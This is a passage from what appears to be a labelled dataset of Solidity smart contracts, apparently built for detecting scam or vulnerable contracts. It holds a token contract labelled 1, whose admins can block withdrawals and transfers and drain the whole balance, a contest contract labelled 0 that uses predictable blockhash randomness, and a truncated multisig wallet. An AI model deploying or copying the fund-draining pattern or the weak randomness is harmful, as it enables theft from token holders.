_allowance.sub(_value);\r\r\n    Transfer(_from, _to, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Aprove the passed address to spend the specified amount of tokens on beahlf of msg.sender.\r\r\n   * @param _spender The address which will spend the funds.\r\r\n   * @param _value The amount of tokens to be spent.\r\r\n   *\/\r\r\n  function approve(address _spender, uint256 _value) {\r\r\n\r\r\n    \/\/ To change the approve amount you first have to reduce the addresses`\r\r\n    \/\/  allowance to zero by calling `approve(_spender, 0)` if it is not\r\r\n    \/\/  already 0 to mitigate the race condition described here:\r\r\n    \/\/  https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n    require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)) );\r\r\n\r\r\n    allowed[msg.sender][_spender] = _value;\r\r\n    Approval(msg.sender, _spender, _value);\r\r\n  }\r\r\n\r\r\n  \/**\r\r\n   * @dev Function to check the amount of tokens than an owner allowed to a spender.\r\r\n   * @param _owner address The address which owns the funds.\r\r\n   * @param _spender address The address which will spend the funds.\r\r\n   * @return A uint256 specifing the amount of tokens still avaible for the spender.\r\r\n   *\/\r\r\n  function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\r\n    return allowed[_owner][_spender];\r\r\n  }\r\r\n\r\r\n}\r\r\n\r\r\ncontract Pixiu_Beta is StandardToken {\r\r\n\r\r\n    uint public decimals = 6;\r\r\n    bool public isPayable = true;\r\r\n    bool public isWithdrawable = true;\r\r\n\t\r\r\n    struct exchangeRate {\r\r\n        \r\r\n        uint time1;                                      \r\r\n        uint time2;                                     \r\r\n        uint value;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    struct Member {\r\r\n         \r\r\n        bool isExists;                                      \r\r\n        bool isDividend;                                    \r\r\n        bool isWithdraw;                                     \r\r\n        uint256 dividend;                                   \r\r\n        uint256 withdraw;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    exchangeRate[] private exchangeRateArray;  \r\r\n\r\r\n\tmapping (address => Member) private members; \r\r\n    address[] private adminArray;   \r\r\n    address[] private memberArray;\r\r\n\t\r\r\n    address private deposit_address;\r\r\n    uint256 private INITIAL_SUPPLY = 21000000000000;\r\r\n    uint256 private tokenExchangeRateInWei = 0;\r\r\n\r\r\n\t\/\/\u4e0d\u6b78\u96f6\r\r\n\tuint256 private total_tokenwei = 0; \r\r\n\r\r\n\t\/\/ drawall \u6b78\u96f6\r\r\n\tuint256 private total_devidend = 0; \/\/member\r\r\n\tuint256 private total_withdraw = 0; \/\/member\r\r\n    uint256 private deposit_amount = 0;  \/\/deposit\r\r\n    uint256 private withdraw_amount = 0; \/\/deposit\r\r\n    uint256 private dividend_amount = 0; \/\/admin   \r\r\n    \r\r\n    function Pixiu_Beta() {\r\r\n     \r\r\n        totalSupply = INITIAL_SUPPLY; \r\r\n        adminArray.push(msg.sender);\r\r\n        set_deposit_address(msg.sender);\r\r\n        set_exchange_rate_in_eth(300);\r\r\n         \r\r\n    }\r\r\n\r\r\n    modifier onlyDeposit() {\r\r\n        \r\r\n        require(msg.sender == deposit_address);\r\r\n        _;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    modifier onlyAdmin() {\r\r\n        \r\r\n        bool ok = admin_check(msg.sender);\r\r\n        require(ok);\r\r\n        _;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    modifier adminExists(address admin) {\r\r\n\r\r\n        bool ok = false;\r\r\n        if(admin != msg.sender){\r\r\n            \r\r\n            ok = admin_check(admin);\r\r\n        \r\r\n        }\r\r\n        require(ok);\r\r\n        _; \r\r\n        \r\r\n    }\r\r\n    \r\r\n    modifier adminDoesNotExist(address admin) {\r\r\n\r\r\n        bool ok = admin_check(admin);\r\r\n        require(!ok);\r\r\n        _;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function admin_check(address admin) private constant returns(bool){\r\r\n        \r\r\n        bool ok = false;\r\r\n        \r\r\n        for (uint i = 0; i < adminArray.length; i++) {\r\r\n            if (admin == adminArray[i]) {\r\r\n                ok = true;\r\r\n                break;\r\r\n            }\r\r\n        }\r\r\n        \r\r\n        return ok;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    modifier memberExists(address member) {\r\r\n\r\r\n        bool ok = false;\r\r\n        if (members[member].isExists == true) {\r\r\n            \r\r\n            ok = true;\r\r\n            \r\r\n        }\r\r\n        require(ok);\r\r\n        _;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    modifier isMember() {\r\r\n\r\r\n        bool ok = false;\r\r\n        if (members[msg.sender].isExists == true) {            \r\r\n            ok = true;            \r\r\n        }\r\r\n        require(ok);\r\r\n        _;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function admin_deposit(uint xEth) onlyAdmin{\r\r\n        \r\r\n        uint256 xwei = xEth * 10**18;\r\r\n        deposit_amount += xwei;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    \/**\t*\t\u7ba1\u7406\u54e1\u767c\u653e\u80a1\u606f\t*\t\u6bcf\u500b\u6703\u54e1\u80a1\u606f\u4f9d \t*\t*\/\r\r\n    function admin_dividend(uint xEth) onlyAdmin{\r\r\n        \r\r\n\t\tuint256 xwei = xEth * 10**18;\r\r\n\t\trequire(xwei <= (deposit_amount-dividend_amount) ); \r\r\n\r\r\n\t\tdividend_amount += xwei;\r\r\n        uint256 len = memberArray.length;\t\r\r\n        uint i = 0;\r\r\n        address _member;\r\r\n        \r\r\n\t\tuint total_balance_dividened=0;\r\r\n        for( i = 0; i < len; i++){            \r\r\n            _member = memberArray[i];\r\r\n\t\t\tif(members[_member].isDividend){\r\r\n\t\t\t\ttotal_balance_dividened = balances[_member]; \r\r\n\t\t\t}            \r\r\n        }\r\r\n\t\tuint256 perTokenWei = xwei \/ (total_balance_dividened \/ 10 ** 6);\r\r\n            \r\r\n        for( i = 0; i < len; i++){            \r\r\n            _member = memberArray[i];\r\r\n\t\t\tif(members[_member].isDividend){\r\r\n\t\t\t\tuint256 thisWei = (balances[_member] \/ 10 ** 6) * perTokenWei;\r\r\n\t\t\t\tmembers[_member].dividend += thisWei; \r\r\n\t\t\t\ttotal_devidend += thisWei;\r\r\n\t\t\t}            \r\r\n        }\r\r\n    \r\r\n    }\r\r\n    \r\r\n    function set_exchange_rate(uint[] exchangeRates) onlyAdmin{\r\r\n         \r\r\n        uint len = exchangeRates.length;\r\r\n        exchangeRateArray.length = 0;\r\r\n        \r\r\n        for(uint i = 0; i < len; i += 3){\r\r\n            \r\r\n            uint time1 = exchangeRates[i];\r\r\n            uint time2 = exchangeRates[i + 1];\r\r\n            uint value = exchangeRates[i + 2]*1000;\r\r\n            exchangeRateArray.push(exchangeRate(time1, time2, value));      \r\r\n            \r\r\n        }\r\r\n        \r\r\n    }\r\r\n\r\r\n\tfunction get_exchange_wei() returns(uint256){\r\r\n\r\r\n        \r\r\n\t\tuint len = exchangeRateArray.length;  \r\r\n\t\tuint nowTime = block.timestamp;\r\r\n        for(uint i = 0; i < len; i += 3){\r\r\n            \r\r\n\t\t\texchangeRate memory rate = exchangeRateArray[i];\r\r\n            uint time1 = rate.time1;\r\r\n            uint time2 = rate.time2;\r\r\n            uint value = rate.value;\r\r\n\t\t\tif (nowTime>= time1 && nowTime<=time2) {\r\r\n\t\t\t\ttokenExchangeRateInWei = value;\r\r\n\t\t\t\treturn value;\r\r\n\t\t\t}\r\r\n            \r\r\n        }\r\r\n\t\treturn tokenExchangeRateInWei;\r\r\n\t}\r\r\n    \r\r\n    function get_admin_list() constant onlyAdmin returns(address[]){\r\r\n        \r\r\n        return adminArray;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function add_admin(address admin) onlyAdmin adminDoesNotExist(admin){\r\r\n        \r\r\n        adminArray.push(admin);\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function del_admin(address admin) onlyAdmin adminExists(admin){\r\r\n        \r\r\n        for (uint i = 0; i < adminArray.length - 1; i++)\r\r\n            if (adminArray[i] == admin) {\r\r\n                adminArray[i] = adminArray[adminArray.length - 1];\r\r\n                break;\r\r\n            }\r\r\n            \r\r\n        adminArray.length -= 1;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function set_deposit_address(address addr) onlyAdmin{\r\r\n        \r\r\n        deposit_address = addr;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function set_exchange_rate_in_eth(uint256 _exchangeRateInEth) onlyAdmin {\r\r\n        \r\r\n        require(_exchangeRateInEth > 0);\r\r\n        tokenExchangeRateInWei = _exchangeRateInEth * 10**6;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function active_payable() onlyAdmin{\r\r\n    \r\r\n        isPayable = true;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function inactive_payable() onlyAdmin{\r\r\n        \r\r\n        isPayable = false;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function active_withdrawable() onlyAdmin{\r\r\n        \r\r\n        isWithdrawable = true;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function inactive_withdrawable() onlyAdmin{\r\r\n        \r\r\n        isWithdrawable = false;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function active_dividend(address _member) onlyAdmin memberExists(_member){\r\r\n        \r\r\n        members[_member].isDividend = true;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function inactive_dividend(address _member) onlyAdmin memberExists(_member){\r\r\n        \r\r\n        members[_member].isDividend = false;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function active_withdraw(address _member) onlyAdmin memberExists(_member){\r\r\n        \r\r\n        members[_member].isWithdraw = true;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function inactive_withdraw(address _member) onlyAdmin memberExists(_member){\r\r\n        \r\r\n        members[_member].isWithdraw = false;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function get_total_info() onlyAdmin returns(uint256[]){\r\r\n\r\r\n        uint256 total_remain = total_devidend - total_withdraw;\r\r\n        uint256[] memory info = new uint256[](6);\r\r\n        info[0] = deposit_amount;\r\r\n        info[1] = total_devidend;\r\r\n        info[2] = total_remain;\r\r\n        info[3] = total_withdraw;\r\r\n        \r\r\n        return info;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function get_member_info(address _member) onlyAdmin memberExists(_member) returns(uint256[]){\r\r\n        \r\r\n        return get_info(_member);\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function get_my_info() returns(uint256[]){\r\r\n        \r\r\n        return get_info(msg.sender);\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function get_info(address _member) private returns (uint256[]){\r\r\n        \r\r\n        uint256 _devidend = members[_member].dividend;\r\r\n        uint256 _withdraw = members[_member].withdraw;\r\r\n        uint256 _remain = _devidend - _withdraw;\r\r\n        uint256 _balance = balances[_member];\r\r\n        \r\r\n        uint256[] memory _info = new uint256[](4);\r\r\n        _info[0] = _balance;\r\r\n        _info[1] = _devidend;\r\r\n        _info[2] = _remain;\r\r\n        _info[3] = _withdraw;\r\r\n        \r\r\n        return _info;\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function withdraw() isMember {\r\r\n        \r\r\n        uint256 _remain = members[msg.sender].dividend - members[msg.sender].withdraw;\r\r\n        require(_remain > 0);\r\r\n        require(isWithdrawable);\r\r\n        require(members[msg.sender].isWithdraw);\r\r\n        msg.sender.transfer(_remain);\r\r\n        members[msg.sender].withdraw += _remain; \r\r\n        total_withdraw += _remain;          \r\r\n\r\r\n    }\r\r\n\r\r\n    function withdraw_admin(uint xEth) onlyDeposit{\r\r\n\r\r\n        uint256 _withdraw = xEth * 10**18;\r\r\n\t\trequire( msg.sender == deposit_address );\r\r\n\r\r\n\t\trequire(this.balance > _withdraw);\r\r\n\t\tmsg.sender.transfer(_withdraw);\r\r\n\r\r\n        withdraw_amount += _withdraw;  \r\r\n        \r\r\n    }\r\r\n    \r\r\n    function withdraw_all_admin(address _deposit) onlyAdmin {\r\r\n        \r\r\n\t\trequire( _deposit == deposit_address ); \r\r\n\r\r\n\t\t_deposit.transfer(this.balance);\r\r\n\r\r\n\t\ttotal_devidend = 0; \/\/member\r\r\n\t\ttotal_withdraw = 0; \/\/member\r\r\n\t\tdeposit_amount = 0;  \/\/deposit\r\r\n\t\twithdraw_amount = 0; \/\/deposit\r\r\n\t\tdividend_amount = 0; \/\/admin   \r\r\n        \r\r\n    }\r\r\n \r\r\n\t \r\r\n\tfunction transfer(address _to, uint256 _value) onlyPayloadSize(2 * 32)     {\r\r\n\t\trequire(_to != deposit_address);\r\r\n        require(isPayable);\r\r\n\t\tbalances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n\t\tbalances[_to] = balances[_to].add(_value);\r\r\n\r\r\n\t\tif (members[_to].isExists != true) {\t\t\r\r\n\t\t\tmembers[_to].isExists = true;\r\r\n\t\t\tmembers[_to].isDividend = true;\r\r\n\t\t\tmembers[_to].isWithdraw = true; \r\r\n\t\t\tmemberArray.push(_to);\t\t\r\r\n\t\t}  \r\r\n\r\r\n\t\tTransfer(msg.sender, _to, _value);\r\r\n\t}\r\r\n \r\r\n\tfunction transferFrom(address _from, address _to, uint _value) onlyPayloadSize(3 * 32)     {\r\r\n\t\trequire(_to != deposit_address);\r\r\n\t\trequire(_from != deposit_address);\r\r\n        require(isPayable);\r\r\n\t\tvar _allowance = allowed[_from][msg.sender]; \r\r\n\t\trequire(_allowance >= _value);\r\r\n\r\r\n\t\tbalances[_to] = balances[_to].add(_value);\r\r\n\t\tbalances[_from] = balances[_from].sub(_value);\r\r\n\t\tallowed[_from][msg.sender] = _allowance.sub(_value);\r\r\n\t\t\r\r\n\t\tif (members[_to].isExists != true) {\t\t\r\r\n\t\t\tmembers[_to].isExists = true;\r\r\n\t\t\tmembers[_to].isDividend = true;\r\r\n\t\t\tmembers[_to].isWithdraw = true; \r\r\n\t\t\tmemberArray.push(_to);\t\t\r\r\n\t\t}  \r\r\n\r\r\n\t\tTransfer(_from, _to, _value);\r\r\n\t}\r\r\n\r\r\n    \r\r\n    function () payable {\r\r\n        \r\r\n        pay();\r\r\n        \r\r\n    }\r\r\n  \r\r\n    function pay() public payable returns (bool) {\r\r\n        \r\r\n      \r\r\n        require(msg.value > 0);\r\r\n        require(isPayable);\r\r\n        \r\r\n        \/*\r\r\n        uint256 amount = msg.value;\r\r\n        uint256 refund = amount % tokenExchangeRateInWei;\r\r\n        uint256 tokens = (amount - refund) \/ tokenExchangeRateInWei;\r\r\n        balances[msg.sender] = balances[msg.sender].add(tokens);*\/\r\r\n        \r\r\n        if(msg.sender == deposit_address){\r\r\n             deposit_amount += msg.value;\r\r\n        }else{\r\r\n        \r\r\n    \t\tuint256 exchangeWei = get_exchange_wei();\r\r\n    \t\tuint256 thisTokenWei =  exchangeWei * msg.value \/ 10**18 ;\r\r\n        \r\r\n            if (members[msg.sender].isExists != true) {\r\r\n                \r\r\n                members[msg.sender].isExists = true;\r\r\n                members[msg.sender].isDividend = true;\r\r\n                members[msg.sender].isWithdraw = true; \r\r\n                memberArray.push(msg.sender);\r\r\n                \r\r\n            }  \r\r\n    \t\tbalances[msg.sender] += thisTokenWei;\r\r\n    \t\ttotal_tokenwei += thisTokenWei;\r\r\n\t\t\r\r\n        }\r\r\n        \r\r\n        return true;\r\r\n    \r\r\n    }\r\r\n  \r\r\n    function get_balance(address a) public returns(uint256){\r\r\n      \r\r\n        return balances[a];\r\r\n      \r\r\n    }\r\r\n        \r\r\n    function get_balance() public returns(uint256){\r\r\n      \r\r\n        return balances[msg.sender];\r\r\n      \r\r\n    }\r\r\n            \r\r\n    function get_this_balance() public returns(uint256){\r\r\n      \r\r\n        return this.balance;\r\r\n      \r\r\n    }\r\r\n    \r\r\n}","label":1}
{"code":"\/**\r\r\n* The contract defining the contest, allowing participation and voting.\r\r\n* Participation is only possible before the participation deadline.\r\r\n* Voting is only allowed after the participation deadline was met and before the voting deadline expires.\r\r\n* As soon as voting is over, the contest may be closed, resultig in the distribution od the prizes.\r\r\n* The referee may disable certain participants, if their content is inappropiate.\r\r\n*\r\r\n* Copyright (c) 2016 Jam Data, Julia Altenried\r\r\n* *\/\r\r\npragma solidity ^0.4.7;\r\r\ncontract Contest {\r\r\n\/** An ID derived from the contest meta data, so users can verify which contract belongs to which contest **\/\r\r\nuint public id;\r\r\n\/** The contest creator**\/\r\r\naddress owner;\r\r\n\/** The referee deciding if content is appropiate **\/\r\r\naddress public referee;\r\r\n\/** The providers address **\/\r\r\naddress public c4c;\r\r\n\/** List of all participants **\/\r\r\naddress[] public participants;\r\r\n\/** List of all voters **\/\r\r\naddress[] public voters;\r\r\n\/** List of the winning participants *\/\r\r\naddress[] public winners;\r\r\n\/** List of the voters that won a prize *\/\r\r\naddress[] public luckyVoters;\r\r\n\/** The sum of the prizes paid out *\/\r\r\nuint public totalPrize;\r\r\n\/** to efficiently check if somebody already participated **\/\r\r\nmapping(address=>bool) public participated;\r\r\n\/** to efficiently check if somebody already voted **\/\r\r\nmapping(address=>bool) public voted;\r\r\n\/** number of votes per candidate (think about it, maybe it\u2019s better to count afterwards) **\/\r\r\nmapping(address=>uint) public numVotes;\r\r\n\/** disqualified participants**\/\r\r\nmapping(address => bool) public disqualified;\r\r\n\/** timestamp of the participation deadline**\/\r\r\nuint public deadlineParticipation;\r\r\n\/** timestamp of the voting deadline**\/\r\r\nuint public deadlineVoting;\r\r\n\/** participation fee **\/\r\r\nuint128 public participationFee;\r\r\n\/** voting fee**\/\r\r\nuint128 public votingFee;\r\r\n\/** provider fee **\/\r\r\nuint16 public c4cfee;\r\r\n\/** prize distribution **\/\r\r\nuint16 public prizeOwner;\r\r\nuint16 public prizeReferee;\r\r\nuint16[] public prizeWinners;\r\r\n\/\/rest for voters, how many?\r\r\nuint8 public nLuckyVoters;\r\r\n\r\r\n\/** fired when contest is closed **\/\r\r\nevent ContestClosed(uint prize, address[] winners, address[] votingWinners);\r\r\n\r\r\n\/** sets owner, referee, c4c, prizes (in percent with two decimals), deadlines **\/\r\r\nfunction Contest() payable{\r\r\nc4c = 0x87b0de512502f3e86fd22654b72a640c8e0f59cc;\r\r\nc4cfee = 1000;\r\r\nowner = msg.sender;\r\r\n\r\r\ndeadlineParticipation=1498585200;\r\r\ndeadlineVoting=1499190000;\r\r\nparticipationFee=7000000000000000;\r\r\nvotingFee=2000000000000000;\r\r\nprizeOwner=300;\r\r\nprizeReferee=0;\r\r\nprizeWinners.push(6045);\r\r\nnLuckyVoters=1;\r\r\n\r\r\n\r\r\nuint16 sumPrizes = prizeOwner;\r\r\nfor(uint i = 0; i < prizeWinners.length; i++) {\r\r\nsumPrizes += prizeWinners[i];\r\r\n}\r\r\nif(sumPrizes>10000)\r\r\nthrow;\r\r\nelse if(sumPrizes < 10000 && nLuckyVoters == 0)\/\/make sure everything is paid out\r\r\nthrow;\r\r\n}\r\r\n\r\r\n\/**\r\r\n* adds msg.sender to the list of participants if the deadline was not yet met and the participation fee is paid\r\r\n* *\/\r\r\nfunction participate() payable {\r\r\nif(msg.value < participationFee)\r\r\nthrow;\r\r\nelse if (now >= deadlineParticipation)\r\r\nthrow;\r\r\nelse if (participated[msg.sender])\r\r\nthrow;\r\r\nelse if (msg.sender!=tx.origin) \/\/contract could decline money sending or have an expensive fallback function, only wallets should be able to participate\r\r\nthrow;\r\r\nelse {\r\r\nparticipants.push(msg.sender);\r\r\nparticipated[msg.sender]=true;\r\r\n\/\/if the winners list is smaller than the prize list, push the candidate\r\r\nif(winners.length < prizeWinners.length) winners.push(msg.sender);\r\r\n}\r\r\n}\r\r\n\r\r\n\/**\r\r\n* adds msg.sender to the voter list and updates vote related mappings if msg.value is enough, the vote is done between the deadlines and the voter didn&#39;t vote already\r\r\n*\/\r\r\nfunction vote(address candidate) payable{\r\r\nif(msg.value < votingFee)\r\r\nthrow;\r\r\nelse if(now < deadlineParticipation || now >=deadlineVoting)\r\r\nthrow;\r\r\nelse if(voted[msg.sender])\/\/voter did already vote\r\r\nthrow;\r\r\nelse if (msg.sender!=tx.origin) \/\/contract could decline money sending or have an expensive fallback function, only wallets should be able to vote\r\r\nthrow;\r\r\nelse if(!participated[candidate]) \/\/only voting for actual participants\r\r\nthrow;\r\r\nelse{\r\r\nvoters.push(msg.sender);\r\r\nvoted[msg.sender] = true;\r\r\nnumVotes[candidate]++;\r\r\n\r\r\nfor(var i = 0; i < winners.length; i++){\/\/from the first to the last\r\r\nif(winners[i]==candidate) break;\/\/the candidate remains on the same position\r\r\nif(numVotes[candidate]>numVotes[winners[i]]){\/\/candidate is better\r\r\n\/\/else, usually winners[i+1]==candidate, because usually a candidate just improves by one ranking\r\r\n\/\/however, if there are multiple candidates with the same amount of votes, it might be otherwise\r\r\nfor(var j = getCandidatePosition(candidate, i+1); j>i; j--){\r\r\nwinners[j]=winners[j-1];\r\r\n}\r\r\nwinners[i]=candidate;\r\r\nbreak;\r\r\n}\r\r\n}\r\r\n}\r\r\n}\r\r\n\r\r\nfunction getCandidatePosition(address candidate, uint startindex) internal returns (uint){\r\r\nfor(uint i = startindex; i < winners.length; i++){\r\r\nif(winners[i]==candidate) return i;\r\r\n}\r\r\nreturn winners.length-1;\r\r\n}\r\r\n\r\r\n\/**\r\r\n* only called by referee, does not delete the participant from the list, but keeps him from winning (because of inappropiate content), only in contract if a referee exists\r\r\n* *\/\r\r\nfunction disqualify(address candidate){\r\r\nif(msg.sender==referee)\r\r\ndisqualified[candidate]=true;\r\r\n}\r\r\n\r\r\n\/**\r\r\n* only callable by referee. in case he disqualified the wrong participant\r\r\n* *\/\r\r\nfunction requalify(address candidate){\r\r\nif(msg.sender==referee)\r\r\ndisqualified[candidate]=false;\r\r\n}\r\r\n\r\r\n\/**\r\r\n* only callable after voting deadline, distributes the prizes, fires event?\r\r\n* *\/\r\r\nfunction close(){\r\r\n\/\/ if voting already ended and the contract has not been closed yet\r\r\nif(now>=deadlineVoting&&totalPrize==0){\r\r\ndetermineLuckyVoters();\r\r\nif(this.balance>10000) distributePrizes(); \/\/more than 10000 wei so every party gets at least 1 wei (if s.b. gets 0.01%)\r\r\nContestClosed(totalPrize, winners, luckyVoters);\r\r\n}\r\r\n}\r\r\n\r\r\n\/**\r\r\n* Determines the winning voters\r\r\n* *\/\r\r\nfunction determineLuckyVoters() constant {\r\r\nif(nLuckyVoters>=voters.length)\r\r\nluckyVoters = voters;\r\r\nelse{\r\r\nmapping (uint => bool) chosen;\r\r\nuint nonce=1;\r\r\n\r\r\nuint rand;\r\r\nfor(uint i = 0; i < nLuckyVoters; i++){\r\r\ndo{\r\r\nrand = randomNumberGen(nonce, voters.length);\r\r\nnonce++;\r\r\n}while (chosen[rand]);\r\r\n\r\r\nchosen[rand] = true;\r\r\nluckyVoters.push(voters[rand]);\r\r\n}\r\r\n}\r\r\n}\r\r\n\r\r\n\/**\r\r\n* creates a random number in [0,range)\r\r\n* *\/\r\r\nfunction randomNumberGen(uint nonce, uint range) internal constant returns(uint){\r\r\nreturn uint(block.blockhash(block.number-nonce))%range;\r\r\n}\r\r\n\r\r\n\/**\r\r\n* distribites the contract balance amongst the creator, wthe winners, the lucky voters, the referee and the provider\r\r\n* *\/\r\r\nfunction distributePrizes() internal{\r\r\n\r\r\nif(!c4c.send(this.balance\/10000*c4cfee)) throw;\r\r\ntotalPrize = this.balance;\r\r\nif(prizeOwner!=0 && !owner.send(totalPrize\/10000*prizeOwner)) throw;\r\r\nif(prizeReferee!=0 && !referee.send(totalPrize\/10000*prizeReferee)) throw;\r\r\nfor (uint8 i = 0; i < winners.length; i++)\r\r\nif(prizeWinners[i]!=0 && !winners[i].send(totalPrize\/10000*prizeWinners[i])) throw;\r\r\nif (luckyVoters.length>0){\/\/if anybody voted\r\r\nif(this.balance>luckyVoters.length){\/\/if there is ether left to be distributed amongst the lucky voters\r\r\nuint amount = this.balance\/luckyVoters.length;\r\r\nfor(uint8 j = 0; j < luckyVoters.length; j++)\r\r\nif(!luckyVoters[j].send(amount)) throw;\r\r\n}\r\r\n}\r\r\nelse if(!owner.send(this.balance)) throw;\/\/if there is no lucky voter, give remainder to the owner\r\r\n}\r\r\n\r\r\n\/**\r\r\n* returns the total vote count\r\r\n* *\/\r\r\nfunction getTotalVotes() constant returns(uint){\r\r\nreturn voters.length;\r\r\n}\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.8;\r\r\n\r\r\n\r\r\n\/\/\/ @title Multisignature wallet - Allows multiple parties to agree on transactions before execution.\r\r\n\/\/\/ @author Stefan George - <<a href=\"\/cdn-cgi\/l\/email-protection\" class=\"__cf_email__\" data-cfemail=\"6112150407000f4f06040e13060421020e0f12040f1218124f0f0415\">[email&#160;protected]<\/a>>\r\r\ncontract MultiSigWallet {\r\r\n\r\r\n    \/\/ flag to determine if address is for a real contract or not\r\r\n    bool public isMultiSigWallet = false;\r\r\n\r\r\n    uint constant public MAX_OWNER_COUNT = 50;\r\r\n\r\r\n    event Confirmation(address indexed sender, uint indexed transactionId);\r\r\n    event Revocation(address indexed sender, uint indexed transactionId);\r\r\n    event Submission(uint indexed transactionId);\r\r\n    event Execution(uint indexed transactionId);\r\r\n    event ExecutionFailure(uint indexed transactionId);\r\r\n    event Deposit(address indexed sender, uint value);\r\r\n    event OwnerAddition(address indexed owner);\r\r\n    event OwnerRemoval(address indexed owner);\r\r\n    event RequirementChange(uint required);\r\r\n\r\r\n    mapping (uint => Transaction) public transactions;\r\r\n    mapping (uint => mapping (address => bool)) public confirmations;\r\r\n    mapping (address => bool) public isOwner;\r\r\n    address[] public owners;\r\r\n    uint public required;\r\r\n    uint public transactionCount;\r\r\n\r\r\n    struct Transaction {\r\r\n        address destination;\r\r\n        uint value;\r\r\n        bytes data;\r\r\n        bool executed;\r\r\n    }\r\r\n\r\r\n    modifier onlyWallet() {\r\r\n        if (msg.sender != address(this)) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier ownerDoesNotExist(address owner) {\r\r\n        if (isOwner[owner]) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier ownerExists(address owner) {\r\r\n        if (!isOwner[owner]) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier transactionExists(uint transactionId) {\r\r\n        if (transactions[transactionId].destination == 0) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier confirmed(uint transactionId, address owner) {\r\r\n        if (!confirmations[transactionId][owner]) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier notConfirmed(uint transactionId, address owner) {\r\r\n        if (confirmations[transactionId][owner]) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier notExecuted(uint transactionId) {\r\r\n        if (transactions[transactionId].executed) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier notNull(address _address) {\r\r\n        if (_address == 0) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    modifier validRequirement(uint ownerCount, uint _required) {\r\r\n        if (ownerCount > MAX_OWNER_COUNT) throw;\r\r\n        if (_required > ownerCount) throw;\r\r\n        if (_required == 0) throw;\r\r\n        if (ownerCount == 0) throw;\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Fallback function allows to deposit ether.\r\r\n    function()\r\r\n        payable\r\r\n    {\r\r\n        if (msg.value > 0)\r\r\n            Deposit(msg.sender, msg.value);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n     * Public functions\r\r\n     *\/\r\r\n    \/\/\/ @dev Contract constructor sets initial owners and required number of confirmations.\r\r\n    \/\/\/ @param _owners List of initial owners.\r\r\n    \/\/\/ @param _required Number of required confirmations.\r\r\n    function MultiSigWallet(address[] _owners, uint _required)\r\r\n        public\r\r\n        validRequirement(_owners.length, _required)\r\r\n    {\r\r\n        for (uint i=0; i<_owners.length; i++) {\r\r\n            if (isOwner[_owners[i]] || _owners[i] == 0) throw;\r\r\n            isOwner[_owners[i]] = true;\r\r\n        }\r\r\n        isMultiSigWallet = true;\r\r\n        owners = _owners;\r\r\n        required = _required;\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows to add a new owner. Transaction has to be sent by wallet.\r\r\n    \/\/\/ @param owner Address of new owner.\r\r\n    function addOwner(address owner)\r\r\n        public\r\r\n        onlyWallet\r\r\n        ownerDoesNotExist(owner)\r\r\n        notNull(owner)\r\r\n        validRequirement(owners.length + 1, required)\r\r\n    {\r\r\n        isOwner[owner] = true;\r\r\n        owners.push(owner);\r\r\n        OwnerAddition(owner);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows to remove an owner. Transaction has to be sent by wallet.\r\r\n    \/\/\/ @param owner Address of owner.\r\r\n    function removeOwner(address owner)\r\r\n        public\r\r\n        onlyWallet\r\r\n        ownerExists(owner)\r\r\n    {\r\r\n        isOwner[owner] = false;\r\r\n        for (uint i=0; i<owners.length - 1; i++)\r\r\n            if (owners[i] == owner) {\r\r\n                owners[i] = owners[owners.length - 1];\r\r\n                break;\r\r\n            }\r\r\n        owners.length -= 1;\r\r\n        if (required > owners.length)\r\r\n            changeRequirement(owners.length);\r\r\n        OwnerRemoval(owner);\r\r\n    }\r\r\n\r\r\n    \/\/\/ @dev Allows to replace an owner with a new owner. Transaction has to be sent by wallet.\r\r\n    \/\/\/ @param owner Address of owner to be replaced.\r\r\n    \/\/\/ @param newOwner Address of new owner.\r\r\n    \/\/\/ @param index the indx of the owner to be replaced\r\r\n    function replaceOwnerIndexed(address owner, address newOwner, uint index)\r\r\n        public\r\r\n        onlyWallet\r\r\n        ownerExists(owner)\r\r\n        ownerDoesNotExist(newOwner)\r\r\n    {\r\r\n        if (owners[index] != owner) throw;\r\r\n        owners[index] = newOwner;\r\r\n        isOwner[owner] = false;\r\r\n        isOwner[newOwner] = true;\r\r\n        OwnerRemoval(owner);\r\r\n        